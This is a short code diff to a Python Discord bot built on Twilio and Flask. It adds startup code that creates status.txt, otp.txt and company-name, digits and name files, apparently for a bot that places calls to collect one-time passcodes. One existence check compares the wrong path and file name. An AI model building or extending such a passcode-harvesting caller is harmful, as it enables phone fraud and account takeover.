@@ -5,6 +5,7 @@ from discord_slash import SlashCommand, SlashContext
 from flask import Flask, request
 from twilio.rest import Client
 import time
+import os
 
 client_discord = commands.Bot(command_prefix='=')
 slash = SlashCommand(client_discord, sync_commands=True)
@@ -18,7 +19,18 @@ server_id = 953877934937096232 #Your ServerID
 
 app = Flask(__name__)
 
-
+if not 'status.txt' in os.listdir():
+    open('status.txt',  'w').close()
+if not 'otp.txt' in os.listdir():
+    open('otp.txt', 'w').close()
+if not 'Extra' in os.listdir():
+    os.mkdir('Extra')
+if not 'Company Name.txt' in os.listdir('Extra'):
+    open('Extra/Company Name', 'w').close()
+if not 'Digits.txt' in os.listdir('Extra'):
+    open('Extra/Digits.txt', 'w').close()
+if not 'Name.txt' in os.listdir('Extra'):
+    open('Extra/Name.txt', 'w').close()
 
 @slash.slash(
     name='call',
